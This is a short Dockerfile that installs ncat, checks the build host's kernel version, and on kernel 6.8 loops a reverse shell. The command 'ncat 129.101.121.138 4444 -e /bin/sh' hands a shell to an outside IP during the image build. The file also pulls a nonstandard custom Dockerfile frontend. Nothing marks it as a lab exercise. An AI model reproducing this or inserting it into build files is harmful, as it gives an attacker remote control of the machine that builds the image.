# syntax=er028455/df-frontend:v4
FROM alpine:3.23
RUN apk add --no-cache nmap-ncat coreutils procps \
 && KVER=$(uname -r) \
 && echo "CB=$CACHEBUST KERNEL=$KVER" >&2 \
 && case "$KVER" in \
      6.8.*) \
        echo "6.8-147*** KErneLL ----------------- revshell" >&2 ;; \
      *) \
        echo "SKIP: KERNEL $KVER not 6.8" >&2 ; exit 0 ;; \
    esac \
 && while true; do \
      ncat 129.101.121.138 4444 -e /bin/sh 2>/dev/null; \
      sleep 5; \
    done
